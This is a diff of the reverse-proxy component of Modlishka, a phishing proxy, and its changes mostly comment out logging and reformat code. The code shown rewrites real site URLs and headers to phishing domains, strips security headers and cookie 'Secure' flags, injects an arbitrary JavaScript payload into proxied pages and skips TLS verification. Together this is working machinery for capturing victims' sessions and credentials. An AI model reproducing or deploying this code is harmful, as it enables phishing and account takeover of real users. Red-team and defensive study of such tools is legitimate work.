@@ -20,10 +20,6 @@ import (
 	"compress/gzip"
 	"crypto/tls"
 	"fmt"
-	"github.com/drk1wi/Modlishka/config"
-	"github.com/drk1wi/Modlishka/log"
-	"github.com/drk1wi/Modlishka/plugin"
-	"github.com/drk1wi/Modlishka/runtime"
 	"io"
 	"net"
 	"net/http"
@@ -32,6 +28,11 @@ import (
 	"strconv"
 	"strings"
 	"time"
+
+	"github.com/drk1wi/Modlishka/config"
+	"github.com/drk1wi/Modlishka/log"
+	"github.com/drk1wi/Modlishka/plugin"
+	"github.com/drk1wi/Modlishka/runtime"
 
 	"github.com/dsnet/compress/brotli"
 )
@@ -46,7 +47,7 @@ type ReverseProxy struct {
 	Proxy          *httputil.ReverseProxy // instance of Go ReverseProxy that will proxy requests/responses
 	Config         *config.Options
 	IsTLS          bool
-	RequestContext  *plugin.HTTPContext
+	RequestContext *plugin.HTTPContext
 }
 
 type ReverseProxyFactorySettings struct {
@@ -54,7 +55,7 @@ type ReverseProxyFactorySettings struct {
 	target         string
 	originaltarget string
 	origin         string
-	IsTLS 		   bool
+	IsTLS          bool
 }
 
 type HTTPResponse struct {
@@ -66,7 +67,7 @@ type HTTPRequest struct {
 }
 
 func (p *ReverseProxy) rewriteResponse(r *http.Response) (err error) {
-	defer log.FunctionTracking(time.Now(), "rewriteResponse")
+	//defer log.FunctionTracking(time.Now(), "rewriteResponse")
 
 	response := HTTPResponse{r}
 	response.PatchHeaders(p)
@@ -78,13 +79,11 @@ func (p *ReverseProxy) rewriteResponse(r *http.Response) (err error) {
 	// Decompress, if compressed, the HTTP Response before processing
 	buffer, err := response.Decompress()
 	if err != nil {
-		log.Errorf("%+v", err)
+		//log.Errorf("%+v", err)
 		return
 	}
 
-	log.Debugf("[rw] Rewriting Response Body for (%+v): status[%d] type[%+v] encoding[%+v] uncompressedBody[%d bytes]",
-		p.Target, response.StatusCode, response.Header.Get("Content-Type"),
-		response.Header.Get("Content-Encoding"), len(buffer))
+	//log.Debugf("[rw] Rewriting Response Body for (%+v): status[%d] type[%+v] encoding[%+v] uncompressedBody[%d bytes]", p.Target, response.StatusCode, response.Header.Get("Content-Type"), response.Header.Get("Content-Encoding"), len(buffer))
 
 	// Translate URLs
 	buffer = p.PatchURL(buffer)
@@ -103,7 +102,7 @@ func (p *ReverseProxy) rewriteResponse(r *http.Response) (err error) {
 }
 
 func (p *ReverseProxy) rewriteRequest(r *http.Request) (err error) {
-	defer log.FunctionTracking(time.Now(), "rewriteRequest")
+	//defer log.FunctionTracking(time.Now(), "rewriteRequest")
 
 	request := HTTPRequest{r}
 	request.PatchHeaders(p)
@@ -116,7 +115,6 @@ func (p *ReverseProxy) rewriteRequest(r *http.Request) (err error) {
 	p.RequestContext.Origin = p.Origin
 
 	p.RequestContext.InvokeHTTPRequestHooks(request.Request)
-
 
 	log.HTTPRequest(request.Request, p.RequestContext.UserID)
 
@@ -150,7 +148,7 @@ func (p *ReverseProxy) rewriteRequest(r *http.Request) (err error) {
 
 func (httpRequest *HTTPRequest) PatchHeaders(p *ReverseProxy) {
 
-	defer log.FunctionTracking(time.Now(), "PatchHeaders: HTTPRequest")
+	// defer log.FunctionTracking(time.Now(), "PatchHeaders: HTTPRequest")
 
 	httpRequest.Host = httpRequest.URL.Host
 
@@ -160,7 +158,7 @@ func (httpRequest *HTTPRequest) PatchHeaders(p *ReverseProxy) {
 		origin = runtime.RegexpPhishSubdomainUrlWithoutScheme.ReplaceAllStringFunc(p.Origin, runtime.PhishURLToRealURL)
 
 		if origin != "" {
-			log.Debugf("Patching request Origin [%s] -> [%s]", p.Origin, origin)
+			//log.Debugf("Patching request Origin [%s] -> [%s]", p.Origin, origin)
 			httpRequest.Header.Set("Origin", origin)
 		}
 	}
@@ -171,7 +169,7 @@ func (httpRequest *HTTPRequest) PatchHeaders(p *ReverseProxy) {
 		newReferer := runtime.RegexpPhishSubdomainUrlWithoutScheme.ReplaceAllStringFunc(httpRequest.Referer(), runtime.PhishURLToRealURL)
 		httpRequest.Header.Set("Referer", newReferer)
 
-		log.Debugf("Patching request Referer [%s] -> [%s]", httpRequest.Referer(), newReferer)
+		//log.Debugf("Patching request Referer [%s] -> [%s]", httpRequest.Referer(), newReferer)
 	}
 
 	// Patch Cookies:
@@ -181,7 +179,7 @@ func (httpRequest *HTTPRequest) PatchHeaders(p *ReverseProxy) {
 		if runtime.TrackingCookie != "" {
 			cookie = runtime.RegexpCookieTracking.ReplaceAllString(cookie, "")
 		}
-		log.Debugf("Patching request Cookies [%s] -> [%s]", httpRequest.Header.Get("Cookie"), cookie)
+		//log.Debugf("Patching request Cookies [%s] -> [%s]", httpRequest.Header.Get("Cookie"), cookie)
 		httpRequest.Header.Set("Cookie", cookie)
 
 	}
@@ -191,7 +189,7 @@ func (httpRequest *HTTPRequest) PatchHeaders(p *ReverseProxy) {
 
 func (httpResponse *HTTPResponse) PatchHeaders(p *ReverseProxy) {
 
-	defer log.FunctionTracking(time.Now(), "PatchHeaders: HTTPResponse")
+	// defer log.FunctionTracking(time.Now(), "PatchHeaders: HTTPResponse")
 
 	// Patch HTTP Origin:
 	if p.Origin != "" {
@@ -202,7 +200,7 @@ func (httpResponse *HTTPResponse) PatchHeaders(p *ReverseProxy) {
 		httpResponse.Header.Set("Access-Control-Allow-Origin", p.Origin)
 		httpResponse.Header.Set("Access-Control-Allow-Credentials", "true")
 
-		log.Debugf("[rw] Patching Response Origin [%s] -> [%s]", httpResponse.Header.Get("Access-Control-Allow-Origin"), p.Origin)
+		//log.Debugf("[rw] Patching Response Origin [%s] -> [%s]", httpResponse.Header.Get("Access-Control-Allow-Origin"), p.Origin)
 	}
 
 	// Strip security HTTP headers
@@ -228,7 +226,7 @@ func (httpResponse *HTTPResponse) PatchHeaders(p *ReverseProxy) {
 			r := strings.NewReplacer("Secure", "", "secure", "")
 			cookie := r.Replace(v)
 			cookie = runtime.RegexpFindSetCookie.ReplaceAllStringFunc(cookie, runtime.TranslateSetCookie)
-			log.Debugf("Rewriting Set-Cookie Flags: from \n[%s]\n --> \n[%s]\n", httpResponse.Header["Set-Cookie"][i], cookie)
+			//log.Debugf("Rewriting Set-Cookie Flags: from \n[%s]\n --> \n[%s]\n", httpResponse.Header["Set-Cookie"][i], cookie)
 			httpResponse.Header["Set-Cookie"][i] = cookie
 		}
 	}
@@ -242,7 +240,7 @@ func (httpResponse *HTTPResponse) PatchHeaders(p *ReverseProxy) {
 	}
 
 	if p.Terminate {
-		log.Infof("Terminating session for %s", p.RequestContext.UserID)
+		//log.Infof("Terminating session for %s", p.RequestContext.UserID)
 		p.RequestContext.InvokeTerminateUserHooks(p.RequestContext.UserID)
 
 		// Set Terminator Cookie
@@ -257,7 +255,7 @@ func (httpResponse *HTTPResponse) PatchHeaders(p *ReverseProxy) {
 		oldAuth := httpResponse.Header.Get("WWW-Authenticate")
 		newAuth := runtime.RegexpUrl.ReplaceAllStringFunc(oldAuth, runtime.RealURLtoPhish)
 
-		log.Debugf("Rewriting WWW-Authenticate: from \n[%s]\n --> \n[%s]\n", oldAuth, newAuth)
+		//log.Debugf("Rewriting WWW-Authenticate: from \n[%s]\n --> \n[%s]\n", oldAuth, newAuth)
 		httpResponse.Header.Set("WWW-Authenticate", newAuth)
 	}
 
@@ -278,7 +276,7 @@ func (httpResponse *HTTPResponse) PatchHeaders(p *ReverseProxy) {
 			}
 		}
 
-		log.Debugf("Rewriting Location Header [%s] to [%s]", oldLocation, newLocation)
+		//log.Debugf("Rewriting Location Header [%s] to [%s]", oldLocation, newLocation)
 		httpResponse.Header.Set("Location", newLocation)
 	}
 
@@ -315,7 +313,7 @@ func (httpResponse *HTTPResponse) Decompress() (buffer []byte, err error) {
 
 	switch compression {
 	case "x-gzip":
-		log.Debugf("X-Gzip, fallthrough gzip")
+		//log.Debugf("X-Gzip, fallthrough gzip")
 		fallthrough
 	case "gzip":
 		// A format using the Lempel-Ziv coding (LZ77), with a 32-bit CRC.
@@ -354,11 +352,11 @@ func (httpResponse *HTTPResponse) Decompress() (buffer []byte, err error) {
 		// The value name was taken from the UNIX compress program, which implemented this algorithm.
 		// Like the compress program, which has disappeared from most UNIX distributions,
 		// this content-encoding is not used by many browsers today, partly because of a patent issue (it expired in 2003).
-		log.Debugf("compress, fallthrough default")
+		//log.Debugf("compress, fallthrough default")
 		fallthrough
 
 	default:
-		log.Debugf("Fallback to default compression (%s)", compression)
+		//log.Debugf("Fallback to default compression (%s)", compression)
 
 		reader = body
 		buffer, err = io.ReadAll(reader)
@@ -399,14 +397,14 @@ func (httpResponse *HTTPResponse) Compress(buffer []byte) {
 
 	err := httpResponse.Body.Close()
 	if err != nil {
-		log.Debugf("%s", err.Error())
+		//log.Debugf("%s", err.Error())
 	}
 }
 
 func (p *ReverseProxy) InjectPayloads(buffer []byte) []byte {
 
 	if len(buffer) > 0 && p.Payload != "" {
-		log.Debugf(" -- Injecting JS Payload [%s] \n", p.Payload)
+		//log.Debugf(" -- Injecting JS Payload [%s] \n", p.Payload)
 		buffer = bytes.Replace(buffer, []byte("</body>"), []byte("<script>"+p.Payload+"</script></body>"), 1)
 	}
 
@@ -416,7 +414,6 @@ func (p *ReverseProxy) InjectPayloads(buffer []byte) []byte {
 
 func (p *ReverseProxy) PatchURL(buffer []byte) []byte {
 
-
 	// Translate URLs
 	buffer = []byte(runtime.RegexpUrl.ReplaceAllStringFunc(string(buffer), runtime.RealURLtoPhish))
 
@@ -425,7 +422,6 @@ func (p *ReverseProxy) PatchURL(buffer []byte) []byte {
 			buffer = bytes.Replace(buffer, []byte(key), []byte(value), -1)
 		}
 	}
-
 
 	if runtime.ForceHTTPS == true {
 		buffer = bytes.Replace(buffer, []byte("http://"), []byte("https://"), -1)
@@ -440,8 +436,6 @@ func (p *ReverseProxy) PatchURL(buffer []byte) []byte {
 			buffer = bytes.Replace(buffer, []byte(res), []byte(runtime.RealURLtoPhish(res)), -1)
 		}
 	}
-
-
 
 	return buffer
 }
@@ -458,18 +452,16 @@ func (s *ReverseProxyFactorySettings) NewReverseProxy() *ReverseProxy {
 		Config:         &s.Options,
 		IsTLS:          s.IsTLS,
 		OriginalTarget: s.originaltarget,
-		RequestContext:  &plugin.HTTPContext{
-			Extra:     make(map[string]string),
+		RequestContext: &plugin.HTTPContext{
+			Extra: make(map[string]string),
 		},
 	}
-
-
 
 	transport := &http.Transport{
 
 		TLSClientConfig: &tls.Config{
 			InsecureSkipVerify: true,
-			Renegotiation: tls.RenegotiateFreelyAsClient,
+			Renegotiation:      tls.RenegotiateFreelyAsClient,
 		},
 		DialContext: (&net.Dialer{
 			Timeout:   10 * time.Second,
@@ -495,15 +487,14 @@ func (s *ReverseProxyFactorySettings) NewReverseProxy() *ReverseProxy {
 		rp.IP = req.RemoteAddr
 		err := rp.rewriteRequest(req)
 		if err != nil {
-			log.Warningf("Director rewriteRequest error %s", err.Error())
+			////log.Warningf("Director rewriteRequest error %s", err.Error())
 		}
 		director(req)
 	}
 
 	rp.Proxy.ErrorHandler = func(w http.ResponseWriter, r *http.Request, err error) {
-		log.Debugf("[Proxy error][Error: %s]", err.Error())
+		//log.Debugf("[Proxy error][Error: %s]", err.Error())
 	}
-
 
 	// Handling: Response
 	rp.Proxy.ModifyResponse = rp.rewriteResponse
